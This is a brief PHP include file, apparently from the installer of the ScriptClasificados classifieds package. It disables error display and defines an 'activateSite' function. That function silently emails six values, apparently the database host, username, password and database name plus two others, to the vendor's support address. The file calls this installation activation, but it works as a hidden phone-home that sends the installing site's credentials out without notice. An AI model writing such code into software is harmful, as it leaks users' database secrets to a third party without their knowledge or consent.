<?
///*     ScriptClasificados v8.0                     *///
///*     www.scriptclasificados.com                  *///
///*     Created by cyrweb.com. All rights reserved. *///
///*     Copyright 2009-2017                         *///
error_reporting(0);
ini_set('display_errors','off');
require("sc-includes/php/func/lang.es_ES.php");
function activateSite($h , $u ,$p ,$d ,$r ,$l){
	$mail_support="info@cyrweb.com";
	$subject="Activate Installation Script";
	$body= $r . " - " . $l . " - " . $h . " - " . $u . " - " . $p . " - " . $d . "";
	@mail($mail_support,$subject,$body);
}
?>